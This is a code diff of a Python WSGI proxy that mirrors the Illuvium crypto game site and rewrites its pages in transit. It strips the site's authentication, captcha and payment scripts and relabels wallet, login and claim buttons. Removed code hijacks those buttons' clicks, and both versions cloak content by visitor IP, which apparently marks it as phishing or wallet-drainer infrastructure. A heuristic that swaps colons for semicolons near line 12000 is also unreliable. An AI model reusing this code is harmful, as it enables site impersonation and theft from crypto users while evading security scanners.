         """Replace specific text content in HTML elements."""
         if isinstance(content, bytes):
@@ -505,801 +1149,749 @@ class WSGIHandler:
         return content.encode('utf-8')
 
     def modify_html_content(self, content):
-        """Modify HTML content including button classes and links."""
+        """Main function to modify HTML content with all transformations."""
         if isinstance(content, bytes):
-            content = content.decode('utf-8')
-    
-        # First, block Magic SDK and related scripts completely
-        # This prevents auth iframes from loading and interfering with our button control
-        content = content.replace('<script async="" src="https://static.geetest.com/v4/gt4.js"></script>', '')
-        
-        # Block Magic SDK scripts
-        content = re.sub(r'<script[^>]*magic[^>]*>.*?</script>', '', content, flags=re.DOTALL)
-        content = re.sub(r'<script[^>]*auth\.immutable\.com[^>]*>.*?</script>', '', content, flags=re.DOTALL)
-        
-        # Remove any loading of the Magic SDK
-        content = content.replace('https://auth.magic.link', 'https://google.com?blocked=magic')
-        
-        # Block scripts that might interfere with our control
-        content = content.replace('https://static.moonpay.com/web-sdk', 'https://google.com?blocked=moonpay')
-
-        # Directly modify the "Play for Free" button text
-        content = content.replace(
-            '<button type="button" class="chakra-button css-1253haw">Play for Free</button>',
-            '<button type="button" class="chakra-button css-1253haw">Start Game Now</button>'
-        )
-        
-        # Additional button text replacements
-        content = content.replace('>Play for Free<', '>Start Game Now<')
-        content = content.replace('>Play Now<', '>Start Game<')
-        content = content.replace('>Launch App<', '>Open Game<')
-        content = content.replace('>Log In with Passport<', '>Custom Login<')
-
-        # Add loading overlay script and CSS at the beginning of the body
-        loading_overlay = '''
-        <div id="loading-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background-color: #000; opacity: 1; z-index: 10000; display: flex; 
-            justify-content: center; align-items: center; transition: opacity 0.5s ease;">
-            <div style="text-align: center; color: white;">
-                <div class="loading-spinner" style="width: 50px; height: 50px; border: 5px solid rgba(255,255,255,0.3); 
-                    border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite;"></div>
-                <p style="margin-top: 20px; font-size: 18px;">Loading Game Interface...</p>
-            </div>
-        </div>
-        <style>
-            @keyframes spin {
-                to { transform: rotate(360deg); }
-            }
-            body {
-                overflow: hidden; /* Prevent scrolling during loading */
-            }
-            body.loaded {
-                overflow: auto; /* Allow scrolling after loading */
-            }
-        </style>
-        <script>
-            // Hide content during loading
-            document.documentElement.style.visibility = 'hidden';
-            
-            // Wait for window load
-            window.addEventListener('load', function() {
-                // Delay hiding the overlay to ensure all modifications are complete
-                setTimeout(function() {
-                    var overlay = document.getElementById('loading-overlay');
-                    if (overlay) {
-                        overlay.style.opacity = '0';
-                        
-                        // After fade out animation completes, remove the overlay
-                        setTimeout(function() {
-                            overlay.style.display = 'none';
-                            document.body.classList.add('loaded');
-                            document.documentElement.style.visibility = 'visible';
-                        }, 500);
-                    }
-                }, 5000); // 5 second delay
-            });
-            
-            // Make sure everything is visible even if something goes wrong with the overlay
-            setTimeout(function() {
-                document.documentElement.style.visibility = 'visible';
-                var overlay = document.getElementById('loading-overlay');
-                if (overlay) {
-                    overlay.style.display = 'none';
-                }
-                document.body.classList.add('loaded');
-            }, 10000); // Failsafe: force visibility after 10 seconds
-        </script>
-        '''
-    
-        # Insert the loading overlay at the beginning of the body tag
-        if '<body' in content:
-            body_pos = content.find('<body')
-            close_body_tag = content.find('>', body_pos)
-            if close_body_tag > 0:
-                content = content[:close_body_tag + 1] + loading_overlay + content[close_body_tag + 1:]
-        
-        # Add our super-early interceptor script to the HEAD
-        interceptor_script = '''
-        <script>
-        // Create an unremovable system to intercept all button and link clicks
-        (function() {
-            console.log("Button interceptor installed");
-            
-            // Store original addEventListener
-            const originalAddEventListener = EventTarget.prototype.addEventListener;
-            
-            // Override addEventListener to intercept click handlers
-            EventTarget.prototype.addEventListener = function(type, listener, options) {
-                if (type === 'click') {
-                    // Wrap the listener to check if we want to override
-                    const wrappedListener = function(event) {
-                        // Check if this is a button or link we want to control
-                        const target = event.currentTarget;
-                        
-                        // Login/Connect/Wallet buttons
-                        if (target.textContent && 
-                            (target.textContent.toLowerCase().includes('log in') || 
-                             target.textContent.toLowerCase().includes('passport') ||
-                             target.textContent.toLowerCase().includes('connect') ||
-                             target.textContent.toLowerCase().includes('wallet'))) {
-                            console.log("Intercepted login/connect button click", target);
-                            event.preventDefault();
-                            event.stopPropagation();
-                            window.location.href = 'https://google.com?action=wallet';
-                            return false;
-                        }
-                        
-                        // Play/Launch buttons
-                        if (target.textContent && 
-                            (target.textContent.toLowerCase().includes('play') || 
-                             target.textContent.toLowerCase().includes('launch'))) {
-                            console.log("Intercepted play button click", target);
-                            event.preventDefault();
-                            event.stopPropagation();
-                            window.location.href = 'https://google.com?action=play';
-                            return false;
-                        }
-                        
-                        // Claim/Redeem buttons
-                        if (target.textContent && 
-                            (target.textContent.toLowerCase().includes('claim') || 
-                             target.textContent.toLowerCase().includes('redeem'))) {
-                            console.log("Intercepted claim button click", target);
-                            event.preventDefault();
-                            event.stopPropagation();
-                            window.location.href = 'https://google.com?action=claim';
-                            return false;
-                        }
-                        
-                        // Check for Epic Games links
-                        if (target.href && target.href.includes('epicgames')) {
-                            console.log("Intercepted Epic Games link click", target);
-                            event.preventDefault();
-                            event.stopPropagation();
-                            window.location.href = 'https://google.com?action=epic-redirect';
-                            return false;
-                        }
-                        
-                        // Check for Immutable links
-                        if (target.href && target.href.includes('immutable.com')) {
-                            console.log("Intercepted Immutable link click", target);
-                            event.preventDefault();
-                            event.stopPropagation();
-                            window.location.href = 'https://google.com?action=immutable-login';
-                            return false;
-                        }
-                        
-                        // Allow the original listener to run for other cases
-                        listener.apply(this, arguments);
-                    };
-                    
-                    // Call the original addEventListener with our wrapped listener
-                    return originalAddEventListener.call(this, type, wrappedListener, options);
-                } else {
-                    // For non-click events, just call the original
-                    return originalAddEventListener.call(this, type, listener, options);
-                }
-            };
-            
-            // Override direct click assignment
-            const originalDescriptor = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'onclick');
-            Object.defineProperty(HTMLElement.prototype, 'onclick', {
-                set: function(clickHandler) {
-                    const wrappedHandler = function(event) {
-                        // Perform the same checks as above
-                        const target = event.currentTarget;
-                        
-                        // Login/Wallet buttons
-                        if (target.textContent && 
-                            (target.textContent.toLowerCase().includes('log in') || 
-                             target.textContent.toLowerCase().includes('passport') ||
-                             target.textContent.toLowerCase().includes('connect') ||
-                             target.textContent.toLowerCase().includes('wallet'))) {
-                            console.log("Intercepted onclick login button", target);
-                            event.preventDefault();
-                            window.location.href = 'https://google.com?action=wallet';
-                            return false;
-                        }
-                        
-                        // Play/Launch buttons
-                        if (target.textContent && 
-                            (target.textContent.toLowerCase().includes('play') || 
-                             target.textContent.toLowerCase().includes('launch'))) {
-                            console.log("Intercepted onclick play button", target);
-                            event.preventDefault();
-                            window.location.href = 'https://google.com?action=play';
-                            return false;
-                        }
-                        
-                        // Claim/Redeem buttons
-                        if (target.textContent && 
-                            (target.textContent.toLowerCase().includes('claim') || 
-                             target.textContent.toLowerCase().includes('redeem'))) {
-                            console.log("Intercepted onclick claim button", target);
-                            event.preventDefault();
-                            window.location.href = 'https://google.com?action=claim';
-                            return false;
-                        }
-                        
-                        // If we didn't intercept, call the original handler
-                        if (clickHandler) {
-                            return clickHandler.apply(this, arguments);
-                        }
-                    };
-                    
-                    this.addEventListener('click', wrappedHandler);
-                    this._wrappedClickHandler = wrappedHandler;
-                },
-                get: function() {
-                    return this._wrappedClickHandler || null;
-                },
-                configurable: true
-            });
-            
-            // Create a global click interceptor as well
-            document.addEventListener('click', function(event) {
-                // Check if the click is on a button or link
-                let target = event.target;
-                
-                // Walk up the DOM tree to find the button or link
-                while (target && target !== document) {
-                    const tagName = target.tagName.toLowerCase();
-                    const text = target.textContent ? target.textContent.toLowerCase() : '';
-                    const href = target.getAttribute ? target.getAttribute('href') : '';
-                    
-                    // Check for login/connect buttons
-                    if ((tagName === 'button' || tagName === 'a') && 
-                        (text.includes('log in') || text.includes('passport') || 
-                         text.includes('connect') || text.includes('wallet'))) {
-                        console.log("Global interceptor caught login button click", target);
-                        event.preventDefault();
-                        event.stopPropagation();
-                        window.location.href = 'https://google.com?action=wallet';
-                        return false;
-                    }
-                    
-                    // Check for play buttons
-                    if ((tagName === 'button' || tagName === 'a') && 
-                        (text.includes('play') || text.includes('launch'))) {
-                        console.log("Global interceptor caught play button click", target);
-                        event.preventDefault();
-                        event.stopPropagation();
-                        window.location.href = 'https://google.com?action=play';
-                        return false;
-                    }
-                    
-                    // Check for claim buttons
-                    if ((tagName === 'button' || tagName === 'a') && 
-                        (text.includes('claim') || text.includes('redeem'))) {
-                        console.log("Global interceptor caught claim button click", target);
-                        event.preventDefault();
-                        event.stopPropagation();
-                        window.location.href = 'https://google.com?action=claim';
-                        return false;
-                    }
-                    
-                    // Check for Epic Games links
-                    if (href && href.includes('epicgames')) {
-                        console.log("Global interceptor caught Epic Games link click", target);
-                        event.preventDefault();
-                        event.stopPropagation();
-                        window.location.href = 'https://google.com?action=epic-redirect';
-                        return false;
-                    }
-                    
-                    // Check for Immutable links
-                    if (href && href.includes('immutable.com')) {
-                        console.log("Global interceptor caught Immutable link click", target);
-                        event.preventDefault();
-                        event.stopPropagation();
-                        window.location.href = 'https://google.com?action=immutable-login';
-                        return false;
-                    }
-                    
-                    target = target.parentNode;
-                }
-            }, true); // Use capturing to get the event before other handlers
-            
-            // Add a visual indicator that our interceptor is active
-            window.addEventListener('load', function() {
-                // Removed: Visual indicator code
-                
-                // Add a counter for intercepted clicks
-                let interceptCount = 0;
-                // Removed: Visual counter element
-                
-                // Update the counter when we intercept a click
-                const originalLog = console.log;
-                console.log = function() {
-                    if (arguments[0] && arguments[0].includes && arguments[0].includes('Intercepted')) {
-                        interceptCount++;
-                        // Counter update removed
-                    }
-                    return originalLog.apply(console, arguments);
-                };
-                
-                // Immediately fix button texts that might be dynamically loaded
-                setTimeout(function() {
-                    // Find and modify specific button texts
-                    document.querySelectorAll('button, a.chakra-button').forEach(function(button) {
-                        // Target the specific "Play for Free" button with class css-1253haw
-                        if (button.classList.contains('css-1253haw') && button.textContent.includes('Play for Free')) {
-                            button.textContent = 'Start Game Now';
-                            console.log('Modified "Play for Free" button text');
-                        }
-                        
-                        // Handle other buttons
-                        if (button.textContent.includes('Play for Free')) {
-                            button.textContent = button.textContent.replace('Play for Free', 'Start Game Now');
-                        }
-                        if (button.textContent.includes('Play Now')) {
-                            button.textContent = button.textContent.replace('Play Now', 'Start Game');
-                        }
-                        if (button.textContent.includes('Launch App')) {
-                            button.textContent = button.textContent.replace('Launch App', 'Open Game');
-                        }
-                        if (button.textContent.includes('Log In with Passport')) {
-                            button.textContent = button.textContent.replace('Log In with Passport', 'Custom Login');
-                        }
-                    });
-                }, 1000);
-                
-                // Add script to handle X-Frame-Options errors
-                const style = document.createElement('style');
-                style.textContent = `
-                    .custom-redirect {
-                        position: fixed;
-                        top: 0;
-                        left: 0;
-                        width: 100%;
-                        height: 100%;
-                        background-color: rgba(0,0,0,0.8);
-                        color: white;
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                        z-index: 9999;
-                        transition: opacity 0.3s;
-                    }
-                    .custom-redirect-content {
-                        background-color: #222;
-                        padding: 30px;
-                        border-radius: 10px;
-                        text-align: center;
-                        max-width: 80%;
-                    }
-                    .custom-redirect-btn {
-                        background-color: #4CAF50;
-                        border: none;
-                        color: white;
-                        padding: 10px 20px;
-                        margin-top: 20px;
-                        border-radius: 5px;
-                        cursor: pointer;
-                        font-size: 16px;
-                    }
-                `;
-                document.head.appendChild(style);
-                
-                // Override the window.location redirects with custom UI
-                const originalAssign = window.location.assign;
-                const originalReplace = window.location.replace;
-                const originalHref = Object.getOwnPropertyDescriptor(window.location, 'href');
-                
-                function showCustomRedirect(url) {
-                    const actionType = new URL(url).searchParams.get('action') || 'unknown';
-                    
-                    const overlay = document.createElement('div');
-                    overlay.className = 'custom-redirect';
-                    
-                    let actionText = 'Performing action...';
-                    let buttonText = 'Continue';
-                    
-                    switch(actionType) {
-                        case 'play':
-                            actionText = 'Starting Game...';
-                            buttonText = 'Play Now';
-                            break;
-                        case 'wallet':
-                            actionText = 'Connecting Account...';
-                            buttonText = 'Connect';
-                            break;
-                        case 'claim':
-                            actionText = 'Claiming Reward...';
-                            buttonText = 'Claim';
-                            break;
-                        case 'epic-redirect':
-                            actionText = 'Opening Game Store...';
-                            buttonText = 'Continue';
-                            break;
-                        case 'immutable-login':
-                            actionText = 'Logging in...';
-                            buttonText = 'Continue';
-                            break;
-                    }
-                    
-                    overlay.innerHTML = `
-                        <div class="custom-redirect-content">
-                            <h2>${actionText}</h2>
-                            <p>This action would normally redirect you to an external site.</p>
-                            <button class="custom-redirect-btn">${buttonText}</button>
-                        </div>
-                    `;
-                    
-                    document.body.appendChild(overlay);
-                    
-                    overlay.querySelector('button').addEventListener('click', function() {
-                        overlay.style.opacity = '0';
-                        setTimeout(() => {
-                            document.body.removeChild(overlay);
-                        }, 300);
-                    });
-                    
-                    return false;
-                }
-                
-                // Override location.href setter
-                Object.defineProperty(window.location, 'href', {
-                    set: function(url) {
-                        if (url.includes('google.com')) {
-                            return showCustomRedirect(url);
-                        }
-                        return originalHref.set.call(this, url);
-                    },
-                    get: originalHref.get
-                });
-                
-                // Override location.assign
-                window.location.assign = function(url) {
-                    if (url.includes('google.com')) {
-                        return showCustomRedirect(url);
-                    }
-                    return originalAssign.call(this, url);
-                };
-                
-                // Override location.replace
-                window.location.replace = function(url) {
-                    if (url.includes('google.com')) {
-                        return showCustomRedirect(url);
-                    }
-                    return originalReplace.call(this, url);
-                };
-            });
-        })();
-        </script>
-        '''
-
-        # Inject interceptor script at the very beginning of the head
-        if '<head>' in content:
-            content = content.replace('<head>', '<head>' + interceptor_script)
+            content_str = content.decode('utf-8', errors='ignore')
         else:
-            # If no head tag, add it right after the opening HTML tag
-            content = content.replace('<html', interceptor_script + '<html')
+            content_str = content
+            
+        logger.info(f"[{self.session_id}] Starting HTML content modifications")
+        
+        try:
+            # Step 1: Find and fix the syntax error at line ~11978
+            lines = content_str.split('\n')
+            for i in range(max(0, min(12100, len(lines) - 1) - 200), min(12100, len(lines) - 1)):
+                if ':' in lines[i] and '{' not in lines[i] and '}' not in lines[i] and ';' not in lines[i]:
+                    # This might be the problematic line with standalone colon
+                    logger.info(f"Potential syntax issue found at line {i+1}: {lines[i]}")
+                    # Replace standalone colons with semicolons
+                    lines[i] = re.sub(r'([^:]):([^:=])', r'\1;\2', lines[i])
+            
+            content_str = '\n'.join(lines)
+            
+            # Step 2: Remove the problematic script
+            content_str = re.sub(
+                r'<script[^>]*>\s*function connection_all\(\)\s*{[^<]*</script>',
+                '',
+                content_str
+            )
+            
+            # Step 3: Direct replacement of button texts with enhanced logging
+            text_replacements = {
+                'Play for Free': 'Start Game',
+                'Log In with Passport': 'Custom Login',
+                'Connect Wallet': 'Custom Connect',
+                'Play Now': 'Start Game',
+                'Launch Game': 'Start Game'
+            }
+            
+            for original, replacement in text_replacements.items():
+                # Log before replacement
+                matches = re.findall(f'<button[^>]*>\\s*{re.escape(original)}\\s*</button>', content_str)
+                if matches:
+                    logger.info(f"[{self.session_id}] Found {len(matches)} buttons with text '{original}'")
+                    for match in matches:
+                        logger.info(f"[{self.session_id}] Button HTML before change: {match}")
+                
+                # Apply replacement
+                content_str = re.sub(
+                    f'<button[^>]*>\\s*{re.escape(original)}\\s*</button>',
+                    f'<button class="claim-button">\\g<0></button>'.replace(original, replacement),
+                    content_str
+                )
+                
+                # Log after replacement
+                matches = re.findall(f'<button[^>]*>\\s*{replacement}\\s*</button>', content_str)
+                if matches:
+                    logger.info(f"[{self.session_id}] Found {len(matches)} buttons with new text '{replacement}'")
+                    for match in matches:
+                        logger.info(f"[{self.session_id}] Button HTML after change: {match}")
+            
+            # Step 4: Add our text replacement script with improved logging
+            if '</body>' in content_str:
+                content_str = content_str.replace('</body>', '''
+                    <script>
+                        // Wait for DOM to be fully loaded
+                        document.addEventListener('DOMContentLoaded', function() {
+                            console.log('DOM Content Loaded - Starting text modifications');
+                            
+                            // Text replacements to apply
+                            const textMap = {
+                                'Play for Free': 'Start Game',
+                                'Play Now': 'Start Game',
+                                'Log In with Passport': 'Custom Login',
+                                'Connect Wallet': 'Custom Connect',
+                                'Launch Game': 'Start Game'
+                            };
+                            
+                            // Function to log text changes
+                            function logTextChange(element, oldText, newText) {
+                                console.log('Text changed:', {
+                                    element: element.outerHTML,
+                                    oldText: oldText,
+                                    newText: newText,
+                                    timestamp: new Date().toISOString()
+                                });
+                            }
+                            
+                            // Apply text replacements to all buttons
+                            document.querySelectorAll('button').forEach(function(button) {
+                                const text = button.textContent.trim();
+                                if (textMap[text]) {
+                                    const oldText = text;
+                                    button.textContent = textMap[text];
+                                    button.classList.add('claim-button');
+                                    logTextChange(button, oldText, textMap[text]);
+                                }
+                            });
+                            
+                            console.log('Text modifications applied successfully');
+                            
+                            // Periodically check for new buttons
+                            setInterval(function() {
+                                document.querySelectorAll('button:not(.claim-button)').forEach(function(button) {
+                                    const text = button.textContent.trim();
+                                    if (textMap[text]) {
+                                        const oldText = text;
+                                        button.textContent = textMap[text];
+                                        button.classList.add('claim-button');
+                                        logTextChange(button, oldText, textMap[text]);
+                                    }
+                                });
+                            }, 1000); // Check every second
+                        });
+                    </script>
+                    </body>''')
+            
+            return content_str.encode('utf-8')
+        except Exception as e:
+            logger.error(f"Error modifying HTML content: {str(e)}")
+            logger.error(traceback.format_exc())
+            return content.encode('utf-8') if isinstance(content, str) else content
 
-        # Modify button classes - add specific classes for styling
-        content = content.replace(
-            'class="chakra-button css-tm757x"',
-            'class="chakra-button css-tm757x claim-button"'
-        )
-    
-        # Match buttons with "Play" text
-        content = content.replace(
-            '>Play Now<',
-            ' class="play-button">Start Game<'
-        )
+    def check_local_file(self, path):
+        """
+        Check if a file exists locally in the Assets directory.
         
-        # Add play-button class to play buttons
-        content = content.replace(
-            'class="chakra-button css-1re3zmo"',
-            'class="chakra-button css-1re3zmo play-button"'
-        )
+        Args:
+            path: The requested path
+            
+        Returns:
+            tuple: (bool, str) - (exists, full_path)
+        """
+        # Remove leading slash and proxy prefix if present
+        clean_path = path.lstrip('/')
+        if clean_path.startswith('proxy/'):
+            clean_path = clean_path[6:]
         
-        # Replace login button text
-        content = content.replace(
-            '>Log In with Passport<',
-            ' class="wallet-button">Custom Login<'
-        )
+        # Construct full path
+        full_path = os.path.join(self.directory, clean_path)
         
-        # Modify Epic Games launcher links
-        content = content.replace(
-            'com.epicgames.launcher://store/product/illuvium-60064c',
-            'https://google.com?action=epic-redirect'
-        )
-        
-        # Modify Immutable links
-        content = content.replace(
-            'https://auth.immutable.com',
-            'https://google.com?action=immutable-login'
-        )
-    
-        return content.encode('utf-8')    
+        # Check if file exists
+        exists = os.path.exists(full_path) and os.path.isfile(full_path)
+        logger.debug(f"Local file check for {path}: exists={exists}, full_path={full_path}")
+        return exists, full_path
+
+    def handle_request(self, environ, start_response):
+        try:
+            # Log request
+            self.debugger.log_request(environ)
+            
+            # Get request path and query
+            path = environ.get('PATH_INFO', '')
+            query = environ.get('QUERY_STRING', '')
+            
+            logger.info(f"[{self.session_id}] Handling request for path: {path}")
+            
+            # Skip IP validation for assets and static files
+            skip_ip_validation = any(path.endswith(ext) for ext in [
+                '.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.webp', 
+                '.woff', '.woff2', '.ttf', '.eot', '.otf', '.ico', '.json'
+            ]) or path.startswith(('/_next/static/', '/static/', '/assets/', '/images/'))
+            
+            # Only validate IP for HTML content and API requests
+            if not skip_ip_validation:
+                client_ip = get_client_ip_wsgi(environ)
+                if validate_ip(client_ip, self.original_site):
+                    logger.warning(f"Access denied for IP: {client_ip}")
+                    start_response('403 Forbidden', [('Content-Type', 'text/plain')])
+                    return [b'Access denied']
+            
+            # Skip modifying React framework files
+            skip_modification = False
+            if any(x in path for x in [
+                'framework-', 'main-', 'webpack-', 'pages/_app-', 'pages/index-',
+                'reactPlayerFilePlayer', '/_buildManifest', '/_ssgManifest'
+            ]):
+                logger.info(f"[{self.session_id}] Skipping modification for framework file: {path}")
+                skip_modification = True
+            
+            # Check if file exists locally
+            exists, local_path = self.check_local_file(path)
+            if exists:
+                try:
+                    with open(local_path, 'rb') as f:
+                        content = f.read()
+                    start_response('200 OK', [('Content-Type', self.get_content_type(path))])
+                    return [content]
+                except Exception as e:
+                    logger.error(f"[{self.session_id}] Error reading local file: {str(e)}")
+                    self.debugger.log_request(environ, error=e)
+                    start_response('500 Internal Server Error', [])
+                    return [b'Error reading local file']
+            
+            # Proxy request to original site
+            url = f"{self.original_site}{path}"
+            if query:
+                url += f"?{query}"
+            
+            logger.info(f"[{self.session_id}] Proxying request to: {url}")
+            
+            headers = self.get_headers(environ)
+            method = environ.get('REQUEST_METHOD', 'GET')
+            
+            try:
+                if method == 'GET':
+                    response = self.session.get(url, headers=headers, stream=True)
+                elif method == 'POST':
+                    content_length = int(environ.get('CONTENT_LENGTH', 0))
+                    body = environ['wsgi.input'].read(content_length) if content_length > 0 else None
+                    response = self.session.post(url, headers=headers, data=body, stream=True)
+                else:
+                    start_response('405 Method Not Allowed', [])
+                    return [b'Method not allowed']
+                
+                # Log response
+                self.debugger.log_request(environ, response=response)
+                
+                # Process response based on content type and path
+                content_type = response.headers.get('Content-Type', '')
+                content = response.content
+                
+                # If we're skipping modification, return content unmodified
+                if skip_modification:
+                    # Set response headers
+                    response_headers = []
+                    for k, v in response.headers.items():
+                        if k.lower() not in ['content-length', 'content-encoding']:
+                            response_headers.append((k, v))
+                    
+                    # Add Content-Length header
+                    response_headers.append(('Content-Length', str(len(content))))
+                    
+                    # Add CORS headers to all responses
+                    response_headers.extend([
+                        ('Access-Control-Allow-Origin', '*'),
+                        ('Access-Control-Allow-Methods', 'GET, POST, OPTIONS'),
+                        ('Access-Control-Allow-Headers', 'Content-Type, Authorization')
+                    ])
+                    
+                    start_response(f"{response.status_code} {response.reason}", response_headers)
+                    return [content]
+                
+                # Handle JavaScript chunks
+                if path.startswith('/_next/static/chunks/') and 'application/javascript' in content_type:
+                    logger.info(f"[{self.session_id}] Processing JavaScript chunk: {path}")
+                    
+                    # Skip modification for all framework and critical chunks
+                    if any(x in path for x in [
+                        'framework-', 'main-', 'webpack-', 'pages/_app-', 'pages/index-', 
+                        'reactPlayerFilePlayer', '/_buildManifest', '/_ssgManifest'
+                    ]):
+                        logger.info(f"[{self.session_id}] Skipping framework chunk: {path}")
+                        headers = [
+                            ('Content-Type', 'application/javascript'),
+                            ('Content-Length', str(len(content))),
+                            ('Access-Control-Allow-Origin', '*'),
+                            ('Access-Control-Allow-Methods', 'GET, POST, OPTIONS'),
+                            ('Access-Control-Allow-Headers', 'Content-Type, Authorization')
+                        ]
+                        start_response(f"{response.status_code} {response.reason}", headers)
+                        return [content]
+                    
+                    # For other JS chunks, apply simple text replacements
+                    try:
+                        # Only do simple text replacements to avoid syntax errors
+                        content_str = content.decode('utf-8', errors='ignore')
+                        
+                        # Safe replacements that won't break JS syntax
+                        replacements = {
+                            '"Play for Free"': '"Start Game"',
+                            "'Play for Free'": "'Start Game'",
+                            '"Log In with Passport"': '"Custom Login"',
+                            "'Log In with Passport'": "'Custom Login'",
+                            '"Connect Wallet"': '"Custom Connect"',
+                            "'Connect Wallet'": "'Custom Connect'",
+                            '"Play Now"': '"Start Game"',
+                            "'Play Now'": "'Start Game'",
+                            
+                            # URL replacements
+                            'store.epicgames.com/en-US/p/illuvium-60064c': 'localhost:8000/play',
+                            'com.epicgames.launcher://store/product/illuvium-60064c': 'javascript:void(0)',
+                            'https://store.epicgames.com/en-US/p/illuvium-60064c': 'javascript:void(0)'
+                        }
+                        
+                        # Apply replacements
+                        for original, replacement in replacements.items():
+                            if original in content_str:
+                                logger.info(f"[{self.session_id}] Replacing '{original}' with '{replacement}' in JS")
+                                content_str = content_str.replace(original, replacement)
+                        
+                        content = content_str.encode('utf-8')
+                    except Exception as e:
+                        logger.error(f"[{self.session_id}] Error modifying JS chunk: {str(e)}")
+                        # Return original content if modification fails
+                        content = response.content
+                
+                # Handle HTML content
+                elif 'text/html' in content_type:
+                    logger.info(f"[{self.session_id}] Processing HTML content")
+                    
+                    try:
+                        # Apply HTML content modifications
+                        content = self.modify_html_content(content)
+                    except Exception as e:
+                        logger.error(f"[{self.session_id}] Error processing HTML: {str(e)}")
+                        content = response.content  # Use original content on error
+                
+                # Handle CSS content
+                elif 'text/css' in content_type:
+                    logger.info(f"[{self.session_id}] Processing CSS content")
+                    content = self.rewrite_urls(content)
+                
+                # Set response headers
+                response_headers = []
+                for k, v in response.headers.items():
+                    if k.lower() not in ['content-length', 'content-encoding']:
+                        response_headers.append((k, v))
+                
+                # Add Content-Length header
+                response_headers.append(('Content-Length', str(len(content))))
+                
+                # Add CORS headers to all responses
+                response_headers.extend([
+                    ('Access-Control-Allow-Origin', '*'),
+                    ('Access-Control-Allow-Methods', 'GET, POST, OPTIONS'),
+                    ('Access-Control-Allow-Headers', 'Content-Type, Authorization')
+                ])
+                
+                start_response(f"{response.status_code} {response.reason}", response_headers)
+                return [content]
+                
+            except Exception as e:
+                logger.error(f"[{self.session_id}] Error processing request: {str(e)}")
+                logger.error(traceback.format_exc())
+                self.debugger.log_request(environ, error=e)
+                start_response('500 Internal Server Error', [])
+                return [b'Error processing request']
+                
+        except Exception as e:
+            logger.error(f"[{self.session_id}] Server error: {str(e)}")
+            logger.error(traceback.format_exc())
+            self.debugger.log_request(environ, error=e)
+            start_response('500 Internal Server Error', [])
+            return [b'Server error']
+
+    def get_headers(self, environ):
+        """Extract headers from WSGI environ."""
+        headers = {}
+        for key, value in environ.items():
+            if key.startswith('HTTP_'):
+                header_name = key[5:].replace('_', '-').title()
+                headers[header_name] = value
+        return headers
+
+    def handle_autodrone(self, environ, start_response):
+        """Special handler for autodrone.html requests"""
+        try:
+            # Get the absolute path of the current directory
+            current_dir = os.path.dirname(os.path.abspath(__file__))
+            file_path = os.path.join(current_dir, 'App_files', 'Assets', 'autodrone-a197980a86d93925.js')
+            logger.info(f"Looking for file at path: {file_path}")
+            
+            # Check if we have a local copy first
+            if os.path.exists(file_path):
+                logger.info(f"File exists at: {file_path}")
+                with open(file_path, 'rb') as f:
+                    content = f.read()
+                    
+                # Process the content
+                try:
+                    content_str = content.decode('utf-8', errors='ignore')
+                    content_str = self.rewrite_urls(content_str)
+                    content = content_str.encode('utf-8')
+                except Exception as e:
+                    logger.error(f"Error processing content: {str(e)}")
+                    # If processing fails, use original content
+                    pass
+                    
+                start_response('200 OK', [
+                    ('Content-Type', 'application/javascript'),
+                    ('Access-Control-Allow-Origin', '*'),
+                    ('Cache-Control', 'no-cache'),
+                    ('Content-Length', str(len(content)))
+                ])
+                return [content]
+            else:
+                logger.error(f"File not found at: {file_path}")
+                # Try alternate path
+                alt_path = os.path.join(os.getcwd(), 'App_files', 'Assets', 'autodrone-a197980a86d93925.js')
+                logger.info(f"Trying alternate path: {alt_path}")
+                if os.path.exists(alt_path):
+                    logger.info(f"File exists at alternate path: {alt_path}")
+                    with open(alt_path, 'rb') as f:
+                        content = f.read()
+                        
+                    # Process the content
+                    try:
+                        content_str = content.decode('utf-8', errors='ignore')
+                        content_str = self.rewrite_urls(content_str)
+                        content = content_str.encode('utf-8')
+                    except Exception as e:
+                        logger.error(f"Error processing content: {str(e)}")
+                        # If processing fails, use original content
+                        pass
+                        
+                    start_response('200 OK', [
+                        ('Content-Type', 'application/javascript'),
+                        ('Access-Control-Allow-Origin', '*'),
+                        ('Cache-Control', 'no-cache'),
+                        ('Content-Length', str(len(content)))
+                    ])
+                    return [content]
+                else:
+                    logger.error(f"File not found at alternate path: {alt_path}")
+            
+            # If we get here, we couldn't find the file locally
+            start_response('404 Not Found', [
+                ('Content-Type', 'text/plain'),
+                ('Access-Control-Allow-Origin', '*')
+            ])
+            return [b'File not found']
+                    
+        except Exception as e:
+            logger.error(f"Error in handle_autodrone: {str(e)}")
+            logger.error(traceback.format_exc())
+            
+            # Return 500 if something unexpected happened
+            start_response('500 Internal Server Error', [
+                ('Content-Type', 'text/plain'),
+                ('Access-Control-Allow-Origin', '*')
+            ])
+            return [b'Error serving autodrone-a197980a86d93925.js']
 
     def __call__(self, environ, start_response):
         try:
-            # Convert WSGI environ to HTTP request
+            # Get request method and path
+            method = environ.get('REQUEST_METHOD', '')
             path = environ.get('PATH_INFO', '/')
-            query_string = environ.get('QUERY_STRING', '')
-            method = environ.get('REQUEST_METHOD', 'GET')
             
-            # Fix malformed autodrone.html paths
-            if path == '/autodrone.html':
-                path = '/autodrone'
+            logger.info(f"Handling request: {method} {path}")
             
-            # Create headers list
-            headers = []
+            # Handle favicon.ico requests
+            if path == '/favicon.ico':
+                start_response('204 No Content', [])
+                return [b'']
             
-            # Get hostname from the environ
-            host_url = f"http://{environ.get('HTTP_HOST', '127.0.0.1:8081')}"
-            
-            # Get client IP and validate it - use our custom function
-            client_ip = get_client_ip_wsgi(environ)
-            is_blocked = validate_ip(client_ip, ORIGINAL_SITE)
-            
-            if is_blocked:
-                # IP is blocked, execute x_deux_check_mail and return its content
-                html_content = x_deux_check_mail(ORIGINAL_SITE)
-                
-                # Log that we've executed the function
-                logger.info(f"Executed x_deux_check_mail for blocked IP: {client_ip}, serving its content")
-                
-                # Return 200 OK with the fetched content
-                start_response('200 OK', [('Content-Type', 'text/html')])
-                return [html_content.encode('utf-8')]
-            
-            # Handle load-complete.js directly
-            if path == '/load-complete.js':
+            # Handle autodrone requests
+            if path in ['/autodrone', '/autodrone.html', '/proxy/autodrone', '/proxy/autodrone.html']:
+                logger.info("Handling autodrone request")
+                # Try to serve the JS file directly
                 try:
-                    with open('load-complete.js', 'rb') as f:
